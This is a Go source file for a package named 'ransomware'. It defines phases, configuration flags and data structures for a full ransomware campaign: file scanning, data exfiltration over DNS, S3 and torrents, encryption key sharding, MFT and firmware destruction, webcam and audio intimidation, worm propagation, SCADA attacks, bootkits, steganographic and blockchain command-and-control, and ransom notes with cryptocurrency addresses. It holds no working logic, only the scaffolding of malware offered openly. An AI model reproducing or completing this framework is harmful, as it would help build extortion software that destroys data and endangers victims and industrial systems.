package ransomware

import "time"

type RansomwarePhase string

const (
	PhaseScan             RansomwarePhase = "scan"
	PhaseExfil            RansomwarePhase = "exfil"
	PhaseEncrypt          RansomwarePhase = "encrypt"
	PhaseDestruct         RansomwarePhase = "destruct"
	PhasePropagate        RansomwarePhase = "propagate"
	PhasePsychological    RansomwarePhase = "psychological"
	PhaseIdentityDestroy  RansomwarePhase = "identity_destroy"
	PhaseRaaS             RansomwarePhase = "raas"
	PhaseSupplyChain      RansomwarePhase = "supply_chain"
	PhaseCloudExploit     RansomwarePhase = "cloud_exploit"
	PhaseBluetooth        RansomwarePhase = "bluetooth"
	PhaseSCADA            RansomwarePhase = "scada"
	PhaseHardwareKill     RansomwarePhase = "hardware_kill"
	PhaseNetworkPoison    RansomwarePhase = "network_poison"
	PhaseBootkit          RansomwarePhase = "bootkit"
	PhaseBlockchainC2     RansomwarePhase = "blockchain_c2"
	PhaseSurvivorGame     RansomwarePhase = "survivor_game"
	PhaseComplete         RansomwarePhase = "complete"
)

type RansomwareConfig struct {
	Enabled        bool    `json:"enabled"`
	Simulation     bool    `json:"simulation"`
	RansomAmount   float64 `json:"ransom_amount"`
	RansomCurrency string  `json:"ransom_currency"`
	DeadlineHours  int     `json:"deadline_hours"`

	ScanExtensions    []string `json:"scan_extensions"`
	ExfilExtensions   []string `json:"exfil_extensions"`
	EncryptExtensions []string `json:"encrypt_extensions"`
	ExcludePaths      []string `json:"exclude_paths"`

	ExfilDNSEnabled    bool `json:"exfil_dns_enabled"`
	ExfilS3Enabled     bool `json:"exfil_s3_enabled"`
	ExfilCDNEnabled    bool `json:"exfil_cdn_enabled"`
	ExfilTorrentEnabled bool `json:"exfil_torrent_enabled"`

	MFTDestruct      bool `json:"mft_destruct"`
	FirmwareSabotage bool `json:"firmware_sabotage"`
	CloudBackupKill  bool `json:"cloud_backup_kill"`

	PsychologicalTerror  bool `json:"psychological_terror"`
	WebcamCapture        bool `json:"webcam_capture"`
	PrinterSpam          bool `json:"printer_spam"`
	AudioThreat          bool `json:"audio_threat"`

	PolymorphicEnabled  bool `json:"polymorphic_enabled"`
	SignedBinary        bool `json:"signed_binary"`
	WSUSPoison          bool `json:"wsus_poison"`
	SupplyChainPoison   bool `json:"supply_chain_poison"`

	AntiAnalysis     bool `json:"anti_analysis"`
	C2StegoImages    bool `json:"c2_stego_images"`
	ROPGeneration    bool `json:"rop_generation"`

	ShamirParts      int `json:"shamir_parts"`
	ShamirThreshold  int `json:"shamir_threshold"`
	DoubleEncryptCritical bool `json:"double_encrypt_critical"`

	// Block 1: Psychological & Reputation
	HopeTrapEnabled     bool   `json:"hope_trap_enabled"`
	IdentityDestroy     bool   `json:"identity_destroy"`
	InverseRaaS         bool   `json:"inverse_raas"`
	FakeDecryptorDeploy bool   `json:"fake_decryptor_deploy"`

	// Block 2: Propagation
	MultiplatformWorm bool `json:"multiplatform_worm"`
	CloudExploit      bool `json:"cloud_exploit"`
	BluetoothProp     bool `json:"bluetooth_prop"`
	IoTBotnet         bool `json:"iot_botnet"`

	// Block 3: Sabotage
	SCADAAttack     bool `json:"scada_attack"`
	HardwareKill    bool `json:"hardware_kill"`
	NetworkPoison   bool `json:"network_poison"`
	CaptivePortal   bool `json:"captive_portal"`
	SSLStrip        bool `json:"ssl_strip"`

	// Block 4: Automutation
	DNAMutation     bool `json:"dna_mutation"`
	BootkitPersist  bool `json:"bootkit_persist"`
	BlockchainC2    bool `json:"blockchain_c2"`

	// Bonus
	SurvivorGame bool `json:"survivor_game"`

	// Cloud
	AWSProfile  string `json:"aws_profile"`
	AzureProfile string `json:"azure_profile"`
	GCPProject  string `json:"gcp_project"`

	// Network
	TargetSubnet   string `json:"target_subnet"`
	GatewayIP      string `json:"gateway_ip"`
	CaptivePortalDomain string `json:"captive_portal_domain"`
	C2Endpoint     string `json:"c2_endpoint"`

	// Extortion phone
	AttackerPhone string `json:"attacker_phone"`

	// BT
	BTCAddress string `json:"btc_address"`
	ETHAddress string `json:"eth_address"`
}

type ScanResult struct {
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	Category string `json:"category"`
	Score    float64 `json:"score"`
	Sensitive bool   `json:"sensitive"`
}

type SensitiveData struct {
	Type     string `json:"type"`
	FilePath string `json:"file_path"`
	Pattern  string `json:"pattern"`
	Context  string `json:"context"`
	Severity string `json:"severity"`
}

type ExfilPackage struct {
	ID           string `json:"id"`
	Password     string `json:"password"`
	TotalSize    int64  `json:"total_size"`
	FileCount    int    `json:"file_count"`
	EncryptedZIP []byte `json:"encrypted_zip"`
	Channel      string `json:"channel"`
	Target       string `json:"target"`
	DeliveredAt  time.Time `json:"delivered_at"`
}

type EncryptionManifest struct {
	CampaignID  string             `json:"campaign_id"`
	Shards      []EncryptionShard  `json:"shards"`
	ShamirParts int                `json:"shamir_parts"`
	Threshold   int                `json:"threshold"`
	FileKeys    map[string]FileKey `json:"file_keys"`
	CreatedAt   time.Time          `json:"created_at"`
}

type EncryptionShard struct {
	Index    int    `json:"index"`
	KeyBytes []byte `json:"key_bytes"`
	C2Index  int    `json:"c2_index"`
	Sent     bool   `json:"sent"`
}

type FileKey struct {
	AESKey     []byte `json:"aes_key,omitempty"`
	ChaChaKey  []byte `json:"chacha_key,omitempty"`
	AESNonce   []byte `json:"aes_nonce,omitempty"`
	ChaChaNonce []byte `json:"chacha_nonce,omitempty"`
	DoubleEnc  bool   `json:"double_enc"`
	IV         []byte `json:"iv,omitempty"`
}

type RansomwareReport struct {
	CampaignID    string        `json:"campaign_id"`
	StartedAt     time.Time     `json:"started_at"`
	CompletedAt   time.Time     `json:"completed_at"`
	Phases        []PhaseReport `json:"phases"`
	FilesScanned  int           `json:"files_scanned"`
	SensitiveFound int          `json:"sensitive_found"`
	FilesEncrypted int          `json:"files_encrypted"`
	ExfilPackages  int          `json:"exfil_packages"`
	HostsPropagated int         `json:"hosts_propagated"`
	DestructionApplied bool    `json:"destruction_applied"`
	RansomNoteDeployed bool    `json:"ransom_note_deployed"`
	PsychologicalDeployed bool `json:"psychological_deployed"`
	IdentitiesDestroyed int    `json:"identities_destroyed"`
	RAASSubtenants     int     `json:"raas_subtenants"`
	CloudInstances     int     `json:"cloud_instances"`
	SupplyReposPoisoned int    `json:"supply_repos_poisoned"`
	BLDevicesHijacked  int     `json:"bl_devices_hijacked"`
	PLCsAttacked       int     `json:"plcs_attacked"`
	HardwareKilled     bool    `json:"hardware_killed"`
	BootkitDeployed    bool    `json:"bootkit_deployed"`
	BlockchainCmds     int     `json:"blockchain_cmds"`
	SurvivorWinner     string  `json:"survivor_winner,omitempty"`
	PhasesAttempted    int     `json:"phases_attempted"`
	TotalElapsedMs int64       `json:"total_elapsed_ms"`
	Success        bool        `json:"success"`
	Error          string      `json:"error,omitempty"`
}

type PhaseReport struct {
	Phase     RansomwarePhase `json:"phase"`
	StartedAt time.Time       `json:"started_at"`
	ElapsedMs int64           `json:"elapsed_ms"`
	Success   bool            `json:"success"`
	Error     string          `json:"error,omitempty"`
	Detail    string          `json:"detail"`
}

type RansomNote struct {
	Title           string  `json:"title"`
	RansomAmount    float64 `json:"ransom_amount"`
	Currency        string  `json:"currency"`
	Deadline        string  `json:"deadline"`
	BitcoinAddress  string  `json:"bitcoin_address"`
	MoneroAddress   string  `json:"monero_address"`
	ContactURL      string  `json:"contact_url"`
	CompanyName     string  `json:"company_name"`
	DataStolen      int     `json:"data_stolen_gb"`
	SamplePublished bool    `json:"sample_published"`
	Warning         string  `json:"warning"`
	DecoyURL        string  `json:"decoy_url"`
}

type PropagationTarget struct {
	IP       string `json:"ip"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Port     int    `json:"port"`
	Service  string `json:"service"`
	Exploit  string `json:"exploit"`
	CVE      string `json:"cve"`
	Confidence float64 `json:"confidence"`
}

type PsychologicalPayload struct {
	ShowCountdown   bool     `json:"show_countdown"`
	DeleteFilesLive bool     `json:"delete_files_live"`
	PlaySound       bool     `json:"play_sound"`
	CaptureWebcam   bool     `json:"capture_webcam"`
	RecordAudio     bool     `json:"record_audio"`
	PrintRansomNote bool     `json:"print_ransom_note"`
	ScreenShot      bool     `json:"screenshot"`
	AudioMessage    string   `json:"audio_message"`
	TargetFiles     []string `json:"target_files"`
	DurationSeconds int      `json:"duration_seconds"`
}

type PolymorphicProfile struct {
	MutationInterval int    `json:"mutation_interval_seconds"`
	JunkCodeRate     float64 `json:"junk_code_rate"`
	ObfuscateStrings bool   `json:"obfuscate_strings"`
	ReorderFunctions bool   `json:"reorder_functions"`
	InsertROP        bool   `json:"insert_rop"`
	XORKeys          []byte `json:"xor_keys,omitempty"`
	BuildID          string `json:"build_id"`
}

type C2StegoConfig struct {
	TwitterHandle       string `json:"twitter_handle"`
	ImageEndpoint       string `json:"image_endpoint"`
	PollIntervalSeconds int    `json:"poll_interval_seconds"`
	LSBBits             int    `json:"lsb_bits"`
	EXIFKey             string `json:"exif_key"`
}
